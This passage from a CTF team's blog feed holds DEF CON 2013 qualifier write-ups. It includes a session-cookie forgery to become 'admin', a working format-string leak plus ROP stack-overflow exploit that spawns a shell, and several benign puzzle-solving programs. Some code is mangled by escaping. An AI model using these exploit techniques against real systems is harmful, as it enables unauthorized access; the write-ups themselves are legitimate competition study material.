+<pre><code>xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
+cookie is
+BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</code></pre>
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&#8217;d like to use the Javascript Console in Chrome:</p>
+
+<pre><code>document.cookie='rack.session=xxx;'
+</code></pre>
+
+<p>refresh the page, and enjoy <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p>
+
+<blockquote><p>key</p>
+
+<p>watch out for this Etdeksogav</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Defcon 21 Quals annyong writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/defcon-21-quals-annyong-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/defcon-21-quals-annyong-writeup</id>
+    <content type="html"><![CDATA[<p>For the annyong service, PIE and ASLR are enabled. It&#8217;s easy to discover a format string vulnerability and a stack overflow vulnerability. By leveraging format string attack, libc address on the stack is leaked. Then we can calculate the <code>system</code>, <code>/bin/sh</code>, and <code>pop rdi; ret</code> gadget address in libc. Luckily we have same libc edition with the remote server and get the offsets correctly, or we could get the right libc address by using a brute-force attack in a small range. Then we got a shell by overwritten the stack.</p>
+
+<p>Our code is as below:</p>
+
+<pre><code>import struct, socket, telnetlib
+
+def p64(addr):
+    return struct.pack("&lt;Q", addr)
+
+def interact(s):
+    t = telnetlib.Telnet()                                                  
+    t.sock = s                                                              
+    t.interact()
+    s.close()
+
+def send_recv(s, buf):
+    s.send(buf)
+    return s.recv(4096)
+
+HOST = "annyong.shallweplayaga.me"
+PORT = 5679
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+r = send_recv(s, "%173$p\n")
+lib_ref = int(r, 16)
+
+system_l = 0x45660
+binsh_l = 0x1799d1
+poprdi = 0x229f2
+lib_h = 0x7ffff7a39ed8
+lib_b = 0x7ffff7a60660 - system_l
+lib_base = lib_ref - lib_h + lib_b
+
+system_r = lib_base + system_l
+binsh_r = lib_base + binsh_l
+poprdi = lib_base + poprdi
+
+payload = "A" * 0x810 + 'B' * 8 +  p64(poprdi) + p64(binsh_r) + p64(system_r)
+r = send_recv(s, payload + "\n")
+
+print "We got a shell:"
+interact(s)
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 3 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-3-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-3-writeup</id>
+    <content type="html"><![CDATA[<p>DEF CON CTF Qualifier 2013 OMGACM 3 Writeup</p>
+
+<h2>Problem Description</h2>
+
+<p>The remote host offers a racing game:</p>
+
+<pre><code>% nc grandprix.shallweplayaga.me 2038
+Use 'l' and 'r' to move. Don't crash.
+Press return to start
+</code></pre>
+
+<p>We send a line feed to start the game and receive a 5&#215;9 board:</p>
+
+<pre><code>|-----|
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|  u  |
+|-----|
+</code></pre>
+
+<p>We can send &#8220;l\n&#8221; to move left, &#8220;r\n&#8221; to move right, or &#8220;\n&#8221; to stand.<br/>
+At the end of the round, all obstacles fall. It is obvious that we need to avoide those obstacles.</p>
+
+<h2>Solution</h2>
+
+<p>One way to view the problem is that we are forced to move forward one step each round.<br/>
+We can choose one of the three grids in front us. This is a special case of the dynamic pathfinding problem.</p>
+
+<p>We can apply a breadth-first search to find a safe path from <code>u</code> to some cell in the first row.<br/>
+During the main loop of the search, we record for each cell how to reach it from the orignal grid.<br/>
+As decisions are made once per round, we can record only the first step for each path.</p>
+
+<p>Moreover, we find that there will be a finishing line made up by a row of <code>=</code> not far beyond the 1000th round.<br/>
+It seems that <code>=</code> does not represent an obstacle.</p>
+
+<pre><code>Round 1062 s
+|-----|
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|=====|
+|u    |
+|-----|
+
+Round 1063 s
+|-----|
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|     |
+|u====|
+|-----|
+
+Round 1064 s
+You won this game. Push a key to play again
+
+Round 1065 r
+User won game
+The key is: all our prix belong to you
+
+Round 1066 r
+</code></pre>
+
+<p>So our criterion to check whether a grid represents an obstacle is: <code>c != ' ' &amp;amp;&amp;amp; c != 'u' &amp;amp;&amp;amp; c != '='</code>.</p>
+
+<h2>Programs</h2>
+
+<p>Here is the program with BFS:</p>
+
+<pre><code>#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+using namespace std;
+
+#define FOR(i, a, b) for (int i = (a); i &amp;lt; (b); i++)
+#define REP(i, n) FOR(i, 0, n)
+#define SET(i, v) memset(i, v, sizeof i)
+
+const int N = 11, M = 7;
+char a[N][M+1], first[N][M], buf[4096];
+
+bool isObstacle(char c)
+{
+  return c != &amp;#039; &amp;#039; &amp;amp;&amp;amp; c != &amp;#039;u&amp;#039; &amp;amp;&amp;amp; c != &amp;#039;=&amp;#039;;
+}
+
+bool cmp(int y, int yy)
+{
+  return abs(y-M/2) &amp;lt; abs(yy-M/2);
+}
+
+char work()
+{
+  int t = 0, x, y;
+  REP(i, N) {
+    REP(j, M + 1) {
+      a[i][j] = buf[t++];
+      if (a[i][j] == &amp;#039;u&amp;#039;)
+        y = j;
+    }
+    a[i][M] = 0;
+  }
+
+  const char op[] = &amp;quot;lsr&amp;quot;;
+  SET(first, 0);
+  queue&amp;lt;pair &amp;gt; q;
+  q.push(make_pair(9, y));
+  while (! q.empty()) {
+    x = q.front().first;
+    y = q.front().second;
+    q.pop();
+    if (x == 1) break;
+    int ys[] = {y-1, y, y+1};
+    sort(ys, ys + 3, cmp);
+    REP(i, 3) {
+      int yy = ys[i];
+      if (! first[x-1][yy] &amp;amp;&amp;amp; ! isObstacle(a[x-1][yy])) {
+        first[x-1][yy] = x == 9 ? op[yy-y+1] : first[x][y];
+        q.push(make_pair(x-1, yy));
+      }
+    }
+  }
+
+  const int cols[M-2] = {3,2,4,1,5};
+  REP(i, M-2)
+    if (first[1][cols[i]])
+      return first[1][cols[i]];
+  return 's';
+}
+
+int main()
+{
+  int sock_fd;
+  struct hostent *host;
+  struct sockaddr_in serv_addr = {};
+  if ((host = gethostbyname("grandprix.shallweplayaga.me")) == NULL)
+    return 1;
+  if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    return 1;
+  serv_addr.sin_family = AF_INET;
+  serv_addr.sin_port = htons(2038);
+  serv_addr.sin_addr = *((struct in_addr *)host-&amp;gt;h_addr);
+  if (connect(sock_fd, (struct sockaddr *)&amp;amp;serv_addr, sizeof serv_addr) == -1)
+    return 1;
+
+  // Press return to start
+  read(sock_fd, buf, sizeof buf);
+  puts(buf);
+  write(sock_fd, "\n", 1);
+
+  int round = 0, len;
+  char choice[2] = {0, '\n'};
+  while (len = read(sock_fd, buf, sizeof buf - 1), buf[len] = '', len &amp;gt; 40) {
+    puts(buf);
+    choice[0] = work();
+    printf("Round %d %c\n", ++round, choice[0]);
+    write(sock_fd, choice, sizeof choice);
+  }
+}
+</code></pre>
+
+<p>During the contest, we use another approach to solve this task by using a heuristic to find the &#8220;safest&#8221; column: the one with the least obstacles in the inverted triangle behind it.<br/>
+And then plan a path to move to the safest column while dodging obstacles nearby.</p>
+
+<pre><code>#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#define MAXDATASIZE 4096
+#include
+#include
+using namespace std;
+
+const int N = 11;
+const int M = 7;
+
+char A[N][M+1];
+char buf[MAXDATASIZE];
+
+int x, y;
+
+char path[N];
+
+int c[M+1], s[M+1];
+
+void cnt(int p, int y, int r)
+{
+    if (A[p][y] != ' ') return ;
+    if (p == 1) {
+        c[r]++;
+        return ;
+    }
+    for (int j = -1; j  0 &amp;amp;&amp;amp; y + j &amp;lt; M-1) {
+            cnt(p - 1, y + j, r);
+        }
+}
+
+char op[4]=&amp;quot;lsr&amp;quot;;
+
+bool dfs(int p, int y, int r)
+{
+    if ((A[p][y] != &amp;#039; &amp;#039;) &amp;amp;&amp;amp; (A[p][y] != &amp;#039;u&amp;#039;) &amp;amp;&amp;amp; (A[p][y] != &amp;#039;=&amp;#039;))
+        return 0;
+    if (p == 5) {
+        return y == r;
+    }
+    for (int j = -1; j  0 &amp;amp;&amp;amp; y + j c[j];
+}
+
+void work()
+{
+    //puts(buf);
+    memset(c, 0, sizeof c);
+    int t = 0;
+    for (int i = 0 ; i &amp;lt; N; i++) {
+        for (int j = 0 ; j &amp;lt;= M; j++)
+            A[i][j] = buf[t++];
+        A[i][M] = 0;
+        //puts(A[i]);
+    }
+
+    x = 9;
+    for (int j = 1; j &amp;lt; 6; j++)
+        if (A[9][j] == &amp;#039;u&amp;#039;) y = j;
+
+    for (int i = 1; i &amp;lt; 6; i++) cnt(5, i, i);
+    for (int i = 1; i &amp;lt; 6; i++)  s[i] = i;
+    //sort(s + 1, s + 6, cmp);
+    int k;
+    for (int i = 1; i &amp;lt; 6; i++)
+        for (int j = i+1; j  c[s[j]]) {
+                k = s[i]; s[i] = s[j]; s[j] = k;
+            }
+    for (int i = 1; i h_addr);
+    bzero(&amp;amp;(serv_addr.sin_zero),8);
+    if (connect(sock_fd, (struct sockaddr *)&amp;amp;serv_addr,sizeof(struct sockaddr))==-1){
+        perror("connect error");
+        exit(1);
+    }
+
+    send(sock_fd,"\n",1,0);
+    iLength=recv(sock_fd,buf,sizeof(buf),0);buf[iLength] = 0;
+    puts(buf);
+    iLength=recv(sock_fd,buf,sizeof(buf),0);buf[iLength] = 0;
+    puts(buf);
+
+    int cnt = 0;
+    char r[3] = "";
+    r[1]='\n';
+    do {
+        work();
+        r[0] = path[9];
+        printf("Round %d %s", ++cnt, r);
+        send(sock_fd,r,2,0);
+        iLength=recv(sock_fd,buf,sizeof(buf),0);
+        buf[iLength]=0;
+        puts(buf);
+    } while (iLength &amp;gt; 40);
+}
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 2 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-2-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-2-writeup</id>
+    <content type="html"><![CDATA[<p>DEF CON CTF Qualifier 2013 OMGACM 2 Writeup</p>
+
+<p>Text adventures are one of the oldest types of computer games and form a subset of the adventure genre.<br/>
+After walking around for a while, we find that we need to go all the way north and reach a room with two jugs.</p>
+
+<p><code>look red jug</code>, <code>look blue jug</code> and <code>look inscription</code> gives the detail of a water-pouring problem with two jugs and<br/>
+we are required to give a solution in limited time and trials. One insight is that once we decide to pour water from the red jug to the blue jug,<br/>
+there will be no sense to pour water in the opposite direction (from the blue jug to the red jug) in later actions.<br/>
+What we can do is emptying the blue jug, filling the red jug and pouring water from the red jug to the blue jug.<br/>
+We can thus simulate the two cases (from red to blue and from blue to red) separately and take the case with the smaller actions.</p>
+
+<p>NB. we need to send a bunch of actions at once to reduce time spent on network transmission.<br/>
+It seems that we can only send two packets at a mission. Here is the program:</p>
+
+<pre><code>require 'socket'
+require 'set'
+
+$sock = TCPSocket.new 'diehard.shallweplayaga.me', 4001
+
+def send d
+  $sock.puts d
+  msg = $sock.recv(1024)
+  print msg
+  msg
+end
+
+def recv
+  msg = $sock.recv 1024
+  print msg
+  msg
+end
+
+def pour blue, red, ins
+  r = b = c = 0
+  while b != ins &amp;amp;&amp;amp; r != ins
+    c += 1
+    if b == blue
+      b = 0
+    elsif r &amp;gt; 0
+      bb = [r+b, blue].min
+      r -= bb-b
+      b = bb
+    else
+      r = red
+    end
+  end
+  c
+end
+
+#res = send ''
+#while res[/Exits: (.*)/]
+  #exits = $1.split.select {|c| c != 's' }
+  #res = send(exits.member?('n') ? 'n' : exits[0])
+#end
+send 'nnnnnnenwn'.chars.map {|c| "#{c}\n" }.join.chomp
+
+loop do
+  exchange = false
+
+  res = send "get red jug\nget blue jug\nlook red jug\nlook blue jug\nlook inscription"
+  res += recv until res[/A red jug holds 0 of (\d+) gallons/]
+  red = $1.to_i
+  res += recv until res[/A blue jug holds 0 of (\d+) gallons/]
+  blue = $1.to_i
+  res += recv until res[/To get to the next stage put (\d+) gallons/]
+  ins = $1.to_i
+
+  sred, sblue = 'red', 'blue'
+  res1 = pour blue, red, ins
+  res2 = pour red, blue, ins
+  if res1 &amp;gt; res2
+    exchange = true
+    red, blue = blue, red
+    sred, sblue = sblue, sred
+  end
+
+  r = b = 0
+  msg = ''
+  while b != ins &amp;amp;&amp;amp; r != ins
+    if b == blue
+      b = 0
+      msg += "empty #{sblue} jug\n"
+    elsif r &amp;gt; 0
+      bb = [r+b, blue].min
+      r -= bb-b
+      b = bb
+      msg += "pour #{sred} jug into #{sblue} jug\n"
+    else
+      r = red
+      msg += "fill #{sred} jug\n"
+    end
+  end
+  msg += "put #{b == ins ? sblue : sred} jug onto scale\n"
+  msg += "drop #{b == ins ? sred : sblue} jug\n"
+  msg += "n"
+
+  res = send msg
+  res += recv until res[/You (see|find)/]
+  if res['You find yourself in a solid granite']
+    send "look key\nget key"
+    break
+  end
+end
+</code></pre>
+
+<p>Check out <a href="http://ascii.io/a/3641">http://ascii.io/a/3641</a> to understand the entire flow of the program.</p>
+
+<p>And the very program we used in the contest:</p>
+
+<pre><code>#!/usr/bin/env python
+
+import os, sys, socket, random, subprocess
+from subprocess import Popen, PIPE
+
+import os, sys
+
+def solve(a, b, c):
+    x = y = 0
+    n = 2
+    flag = True
+    while x == 0 and y == 0:
+        for i in range(1, n):
+            t = i * a - (n - i) * b
+            if t == c:
+                x = i
+                y = n - i
+                break
+            elif t == -c:
+                flag = False
+                x = n - i
+                y = i
+                a, b = b, a
+                break
+        n += 1
+    va = vb = 0
+    ret = ''
+    A = B = ''
+    if flag:
+        A = 'red jug'
+        B = 'blue jug'
+    else:
+        A = 'blue jug'
+        B = 'red jug'
+    #print '%d x %d - %d x %d = %d, %d -&amp;gt; %s, %d -&amp;gt; %s' % (x, a, y, b, c, a, A, b, B)
+
+    while x or y:
+        if va == 0:
+            ret += 'fill %s\n' % A
+            x -= 1
+            va = a
+            #print va, vb
+        elif vb == b:
+            ret += 'empty %s\n' % B
+            y -= 1
+            vb = 0
+            #print va, vb
+        else:
+            t = b - vb
+            if t &amp;gt; va:
+                t = va
+            va -= t
+            vb += t
+            ret += 'pour %s into %s\n' % (A, B)
+            #print va, vb
+
+    if va != c and vb != c:
+        vb += va
+        #print va, vb
+        ret += 'pour %s into %s\n' % (A, B) 
+
+    if va == c:
+        ret += 'put %s onto scale\n' % A
+        ret += 'drop %s\nn' % B
+    elif vb == c:
+        ret += 'put %s onto scale\n' % B
+        ret += 'drop %s\nn' % A
+    else:
+        print 'Error'
+
+    return ret
+
+
+
+s = socket.socket()
+s.connect(('diehard.shallweplayaga.me', 4001))
+
+r = ['n', 'n', 's', 's', 'n', 'n', 's', 's', 'w', 'e', 'w', 'w', 's', 'n', 'e', 'e', 'w', 'w', 's', 'n', 'n', 'w', 'e', 'n', 'e', 'w', 'e', 'e', 'w', 'n', 'n', 'e', 'w', 's', 's', 'e', 'e', 'n', 's', 'w', 'e', 'w', 'w', 's', 'n', 'n', 'n', 's', 's', 'e', 'w', 'e', 'e', 'n', 'n', 'n', 'n', 's', 's', 'n', 'n', 's', 'n', 'n', 'n', 'e', 'w', 'e', 'n', 's', 'w', 's', 's', 's', 'n', 's', 's', 'n', 's', 'n', 's', 's', 'n', 'n', 's', 's', 's', 'n', 'n', 'n', 'n', 's', 'n', 'n', 's', 's', 'n', 'n', 's', 's', 's', 's', 'n', 'n', 'n', 's', 's', 's', 's', 'n', 's', 'w', 'w', 'w', 's', 's', 'e', 'w', 'n', 'n', 'e', 'n', 'e', 'e', 'n', 's', 'w', 'e', 'w', 'w', 's', 'n', 'n', 's', 'w', 'e', 'n', 'n', 'e', 'w', 's', 'w', 'e', 'n', 'e', 'e', 'e', 'w', 'w', 'e', 'w', 'w', 's', 'e', 'w', 'e', 'w', 'e', 'w', 'e', 'w', 's', 'n', 'e', 'w', 'e', 'e', 'n', 's', 'w', 'w', 'w', 's', 's', 'e', 'w', 'n', 's', 'e', 'e', 'n', 's', 'w', 'w', 'n', 'n', 's', 'w', 'e', 'n', 's', 'w', 'e', 'w', 'e', 'n', 's', 's', 'e', 'w', 'n', 'w', 'e', 'n', 'e', 'n', 'e', 'w', 'e', 'e', 'n', 'n', 's', 's', 'w', 'e', 'w', 'e', 'w', 'e', 'w', 'e', 'n', 'n', 'n', 's', 's', 'n', 's', 's', 'w', 'w', 'w', 'e', 'w', 'e', 's', 'n', 'e', 'e', 'w', 'e', 'n', 'n', 'n', 'n', 'n', 's', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 's', 's', 'n', 'n', 'n', 's', 's', 'n', 'n', 's', 's', 'n', 's', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 'w', 'w', 's', 'n', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 's', 'n', 'n', 'w', 'e', 'w', 'e', 'w', 'e', 's', 'e', 'e', 'w', 'e', 'w', 'e', 'n', 's', 'w', 'w', 'n', 'w', 'e', 'n', 'e', 's', 'n', 'e', 'e', 'w', 'w', 'e', 'w', 'e', 'w', 'n', 'n', 's', 'n', 'e', 'w', 's', 'w', 'e', 's', 'w', 's', 'w', 'e', 's', 'w', 's', 'e', 'w', 'e', 'w', 'w', 'e', 'e', 'e', 'n', 'n', 'n', 'n', 'n', 'n', 'e', 'n', 'w', 'e', 's', 'w', 's', 'n', 'e', 'n', 'w', 'e', 's', 'w', 'e', 'w', 'e', 'n', 's', 'n', 'w', 'n']
+
+r = 'nnnnnnenwn'
+
+print s.recv(1000)
+
+def send(content):
+    if not content: 
+        return
+    print 'send ...' + content
+    global s
+    s.send(content + '\n')
+    data = s.recv(4096)
+    data = data.strip()
+    if data:
+        print data
+    return data
+
+def interactive():
+    while True:
+        cmd = raw_input('cmd: \n')
+        if cmd == 'quit':
+            return
+        send(cmd)
+
+for i in r:
+    send(i)
+
+send('get red jug')
+send('get blue jug')
+send('fill blue jug')
+send('pour blue jug into red jug')
+send('empty red jug')
+send('pour blue jug into red jug')
+send('fill blue jug')
+send('pour blue jug into red jug')
+send('put blue jug onto scale')
+#send('drop blue jug')
+send('drop red jug')
+send('n')
+send('look')
+
+#send(raw_input('cmd?\n'))
+
+fill_red = 'A red jug holds 0 of '
+fill_blue = 'A blue jug holds 0 of '
+target_str = 'To get to the next stage put '
+
+while True:
+    st = -1
+    ed = -1
+    d = send('look red jug\nlook blue jug\nlook inscription')
+    while st == -1 or ed == -1:
+        st = d.find(fill_red)
+        ed = d.find(' ', st + len(fill_red))
+        if st == -1 or ed == -1:
+            dd = s.recv(4096)
+            dd = dd.strip()
+            if dd:
+                print dd
+            d += dd
+            continue
+        red = int(d[st + len(fill_red): ed])
+
+    st = -1
+    ed = -1
+    while st == -1 or ed == -1:
+        st = d.find(fill_blue)
+        ed = d.find(' ', st + len(fill_blue))
+        if st == -1 or ed == -1:
+            dd = s.recv(4096)
+            dd = dd.strip()
+            if dd:
+                print dd
+            d += dd
+            continue
+        blue = int(d[st + len(fill_blue): ed])
+
+    st = -1
+    ed = -1
+    while st == -1 or ed == -1:
+        st = d.find(target_str)
+        ed = d.find(' ', st + len(target_str))
+        if st == -1 or ed == -1:
+            dd = s.recv(4096)
+            dd = dd.strip()
+            if dd:
+                print dd
+            d += dd
+            continue
+        target = int(d[st + len(target_str):ed])
+
+    print 'solving ... %d %d %d' % (red, blue, target)
+    #p1 = Popen(["./solve.out"], stdin=PIPE, stdout=PIPE)
+    #p1.stdin.write('%d %d %d' % (red, blue, target))
+    #p1.stdin.close()
+    #result = p1.stdout.read() 
+    result = solve(red, blue, target)
+
+    d = send('get red jug\nget blue jug\n' + result.strip())
+
+    while d.find('The scale balances perfectly and a door opens to the next room!') == -1:
+        dd = s.recv(4096)
+        if dd:
+            print dd.strip()
+        d += dd
+    if d.find('You find yourself in a solid granite chamber filled with hexadecimal') &amp;gt; -1:
+        dd = send('look key\nget key')
+        interactive()
+    #interactive()
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 1 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-1-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-1-writeup</id>
+    <content type="html"><![CDATA[<p>We are given several 8-puzzles and are required to give a sequence of actions that leads</p>
+
+<p>from the initial state to the goal state.</p>
+
+<p>Each state of an 8-puzzle can be represented as a permutation of 9 such as 123456780,</p>
+
+<p>which can be expressed as a Lehmor code in the factorial number system.</p>
+
+<p>Given that there is a bijection from 0 ~ n!-1 to a number coded in the factorial number system,</p>
+
+<p>we can encode the state of the 8-puzzle compactly.</p>
+
+<p>Thus we translate the puzzle into a pathfinding problem (from the initial state to the goal state).</p>
+
+<p>Many algorithms apply and we just take one of the simplest: breadth-first search.</p>
+
+<p>On a separate note, we need to send the whole sequence of actions at once to reduce time spent on network transmission.</p>
+
+<p>Here is the heart of the program (in C++ 11):</p>
+
+<pre><code>#include 
+#include 
+#include 
+#include 
+using namespace std;
+
+const int factorial[] = {1,1,2,6,24,120,720,5040,40320};
+
+#define FOR(i, a, b) for (int i = (a); i &amp;lt; (b); i++)
+#define REP(i, n) FOR(i, 0, n)
+
+enum Direction {U, R, D, L};
+
+struct Node
+{
+  int a[9], g;
+  int zero() const {
+    return int(find(a, a + 9, 0) - a);
+  }
+  Node up() {
+    int p = zero();
+    if (p = 6) throw 0;
+    Node res = *this;
+    swap(res.a[p], res.a[p+3]);
+    res.g = g + 1;
+    return res;
+  }
+  Node left() {
+    int p = zero();
+    if (p % 3 == 0) throw 0;
+    Node res = *this;
+    swap(res.a[p], res.a[p-1]);
+    res.g = g + 1;
+    return res;
+  }
+  bool operator==(const Node &amp;amp;rhs) const {
+    return equal(a, a + 9, rhs.a);
+  }
+};
+
+int closed[362880];
+
+const Node dst = 1;
+int lehmorCode(const Node &amp;amp;x)
+{
+  int h = 0;
+  REP(i, 9)
+    REP(j, i)
+      if (x.a[j] &amp;gt; x.a[i])
+        h += factorial[8-j];
+  return h;
+}
+
+int bfs(const Node &amp;amp;src)
+{
+  queue q;
+  fill_n(closed, 362880, -1);
+  int dst_code = lehmorCode(dst);
+
+  Node orig = dst;
+  q.push(orig);
+  closed[dst_code] = -2;
+
+  while (! q.empty()) {
+    Node curr = q.front();
+    q.pop();
+    if (curr == src) return curr.g;
+    int dir = 0;
+    function fs[] = {&amp;amp;Node::up, &amp;amp;Node::right, &amp;amp;Node::down, &amp;amp;Node::left};
+    for (auto f : fs) {
+      dir++;
+      try {
+        Node succ = f(curr);
+        int h = lehmorCode(succ);
+        if (closed[h] == -1) {
+          q.push(succ);
+          closed[h] = dir - 1;
+        }
+      } catch (int) {
+      }
+    }
+  }
+  return -1;
+}
+
+void print(Node x)
+{
+  for(;;) {
+    switch (closed[lehmorCode(x)]) {
+    case U:
+      x = x.down();
+      puts("up");
+      break;
+    case R:
+      x = x.left();
+      puts("right");
+      break;
+    case D:
+      x = x.up();
+      puts("down");
+      break;
+    case L:
+      x = x.right();
+      puts("left");
+      break;
+    case -2:
+      return;
+    }
+  }
+}
+
+int main()
+{
+  Node src;
+  REP(i, 9)
+    scanf("%1d", &amp;amp;src.a[i]);
+  int len = bfs(src);
+  printf("%d\n", len);
+  if (len &amp;gt; 0)
+    print(src);
+}
+</code></pre>
+
+<p>And the communication module written in Ruby:</p>
+
+<pre><code>require 'socket'
+
+s = TCPSocket.new 'pieceofeight.shallweplayaga.me', 8273
+
+src = ''
+rest = 0
+
+while line = s.gets
+  puts line
+  if line =~ /|  \d/
+    xs = line.scan(/\|  ./).map {|x| x[-1] }
+    if xs.find {|x| x =~ /\d/ }
+      src &amp;lt; 0
+      rest -= 1
+    else
+      IO.popen './acm1', 'r+' do |h|
+        h.puts src
+        h.close_write
+        xs = h.read.lines.to_a
+        s.puts xs[1..-1].join
+        rest = xs[0].to_i
+      end
+    end
+    src = ''
+  end
+  if line =~ /The key is/
+    File.open('flag') {|hh| hh.puts line }
+  end
+end
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 gnireenigne 5 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-gnireenigne-5-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-gnireenigne-5-writeup</id>
+    <content type="html"><![CDATA[<p>This is a x64 binary running on Linux. It binds to the first IP of eth0 and accepts connections at port 6823. The client should submit data in the following manner:</p>
+
+<pre><code>4 bytes length | the first block | the second block
+</code></pre>
+
+<p>The two blocks have identical sizes, and the first field indicates the total size of two blocks. The total size should be between 48 and 1024.</p>
+
+<p>After that, our input will be checked against two hashing algorithms. The first one is a standard MD5, and the MD5 values of two blocks cannot be identical, otherwise no key will be printed. The second one is an unknown hashing algorithm. When we found a collision in the second hashing algorithm, we could finally get the key.</p>
+
+<p>We spent some time to fully reverse that algorithm:</p>
+
+<pre><code>unsigned char BOX_[256] = { 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
+    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
+    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
+    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
+    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
+    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
+    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
+    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
+    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
